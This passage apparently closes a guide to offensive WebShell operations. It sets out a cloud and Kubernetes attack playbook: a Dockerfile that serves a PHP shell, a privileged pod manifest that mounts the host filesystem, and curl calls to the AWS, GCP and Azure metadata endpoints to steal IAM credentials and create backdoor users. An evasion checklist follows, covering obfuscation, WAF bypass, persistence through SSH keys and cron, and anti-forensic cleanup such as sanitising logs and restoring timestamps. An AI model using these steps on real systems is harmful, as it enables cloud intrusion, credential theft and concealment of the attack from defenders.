### 10.3 Scenario: Cloud-Native Environment (AWS/GCP/Azure)

**Target: Kubernetes-hosted application with containerized WebShell.**

```
Phase 1: Container WebShell
  - Deploy WebShell as a sidecar container or via compromised pod
  - Minimal WebShell Dockerfile:
    FROM alpine:latest
    RUN apk add --no-cache php
    COPY shell.php /var/www/html/shell.php
    CMD ["php", "-S", "0.0.0.0:8080", "-t", "/var/www/html"]

Phase 2: Kubernetes Persistence
  - Create a privileged pod:
    apiVersion: v1
    kind: Pod
    metadata:
      name: debug-pod
spec:
  containers:
  - name: debug
    image: alpine
    command: ["/bin/sh", "-c", "while true; do sleep 3600; done"]
    volumeMounts:
    - name: host
      mountPath: /host
    securityContext:
      privileged: true
  volumes:
  - name: host
    hostPath:
      path: /

  - From this pod, access host filesystem
  - Deploy WebShell to host node

Phase 3: Cloud Metadata Exploitation
  - From WebShell, access cloud metadata services:
    curl http://169.254.169.254/latest/meta-data/  (AWS)
    curl http://metadata.google.internal/  (GCP)
    curl http://169.254.169.254/metadata/instance?api-version=2021-02-01  (Azure)

  - Extract IAM credentials and use them for cloud API access
  - Create persistent backdoor IAM users/roles
```

### 10.4 Scenario: Evasion Testing Checklist

```
[ ] Static analysis evasion
    [ ] No known malicious strings detected
    [ ] Variable names randomized
    [ ] Function names obfuscated
    [ ] String literals fragmented
    [ ] Comments injected

[ ] Dynamic analysis evasion
    [ ] Password protection working
    [ ] User-Agent filtering active
    [ ] Time-based activation configured
    [ ] 404/403 response for unauthorized access
    [ ] Delay execution enabled

[ ] Traffic analysis evasion
    [ ] HTTPS enforced
    [ ] Traffic encrypted (AES/ChaCha20)
    [ ] Heartbeat disguised as normal traffic
    [ ] Request/response patterns mimic legitimate API
    [ ] Custom headers used

[ ] WAF bypass verification
    [ ] Chunked transfer works
    [ ] Compression bypass works
    [ ] HTTP/2 multiplexing works
    [ ] TLS fingerprint acceptable
    [ ] Content-Type manipulation works

[ ] Persistence verification
    [ ] Multiple WebShell locations
    [ ] Cron/scheduled task active
    [ ] SSH key added
    [ ] Memory horse deployed
    [ ] Database trigger backdoor

[ ] Cleanup
    [ ] Logs sanitized
    [ ] File timestamps restored
    [ ] Upload traces removed
    [ ] No suspicious processes
    [ ] Network connections appear normal
```

---



---
📖 本切片 2/2 结束。 本章节结束。